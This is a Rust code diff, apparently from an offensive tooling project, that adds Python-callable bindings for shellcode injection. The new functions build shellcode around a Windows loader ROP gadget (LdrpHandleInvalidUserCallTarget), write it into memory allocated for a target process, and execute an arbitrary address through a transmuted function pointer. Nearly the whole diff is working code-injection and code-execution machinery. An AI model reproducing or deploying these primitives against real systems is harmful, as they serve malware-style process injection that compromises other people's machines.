@@ -45,6 +45,15 @@ pub struct Handle {
 #[pyclass]
 impl Handle {}
 
+extern "C"
+fn test_func(
+    a1: u64, a2: u64, a3: u64, a4: u64,
+    a5: u64, a6: u64, a7: u64, a8: u64
+) -> u64 {
+    log::info!("test_func({}, {}, {}, {}, {}, {}, {}, {})", a1, a2, a3, a4, a5, a6, a7, a8);
+    10
+}
+
 #[pymodule]
 pub mod br3k {
 
@@ -53,6 +62,7 @@ pub mod br3k {
 
     use sysapi_ctx::SysApiCtx as api_ctx;
     use python::py_module::Handle;
+    use python::py_proc::Process;
 
     use rustpython_vm::{
         VirtualMachine,
@@ -231,9 +241,72 @@ pub mod br3k {
 
     #[pyfunction]
     fn shellcode_get_messageboxw(vm: &VirtualMachine) -> PyResult<PyObjectRef> {
-        let data = shellcode::shellcode_messageboxw();
+        let data = shellcode::generic::messageboxw();
         let bytes = vm.ctx.new_bytes(data.to_vec());
         Ok(bytes.into())
+    }
+
+    #[derive(FromArgs)]
+    pub struct ShellcodeWriteExecViaRopGadgetArgs {
+        #[pyarg(any)]
+        process: PyRef<Process>,
+        #[pyarg(any, optional)]
+        ep: Option<u64>,
+        #[pyarg(any, optional)]
+        args: Option<Vec<u64>>
+    }
+
+    #[pyfunction]
+    fn shellcode_write_exec_via_rop_gadget(args: ShellcodeWriteExecViaRopGadgetArgs, vm: &VirtualMachine) -> PyResult<()> {
+        let mut memory = args.process.memory.borrow_mut();
+        let memory = memory
+            .as_mut()
+            .ok_or_else(|| vm.new_value_error("Memory context is not initialized".to_string()))?;
+
+        let function_address: *const u8 = match args.ep {
+            Some(ep) => ep as _,
+            None => super::test_func as *const () as _,
+        };
+
+        let shellcode = shellcode::ldrp_handle_invalid_user_call_target::build_shellcode_for_gadget(
+            None,
+            function_address,
+            args.args.unwrap_or_default().as_slice(),
+            false // aligned stack + ret address
+        ).unwrap();
+
+        memory.create_memory(shellcode.len())
+            .map_err(|e| vm.new_system_error(format!(
+                "Failed to create memory for shellcode: {}",
+                sysapi::ntstatus_decode(e)
+            )))?;
+
+        memory.write_memory(
+            0,
+            shellcode.as_ptr() as _,
+            shellcode.len()
+        )
+            .map_err(|e| vm.new_system_error(format!(
+                "Failed to write shellcode to memory: {}",
+                sysapi::ntstatus_decode(e)
+            )))?;
+
+        Ok(())
+    }
+
+    #[derive(FromArgs)]
+    pub struct ShellcodeExecute {
+        ep: u64,
+    }
+
+    #[pyfunction]
+    fn shellcode_execute(args: ShellcodeExecute) -> PyResult<()> {
+        unsafe {
+            let func: extern "C" fn() = mem::transmute(args.ep);
+            func();
+        }
+
+        Ok(())
     }
 
     #[derive(FromArgs)]
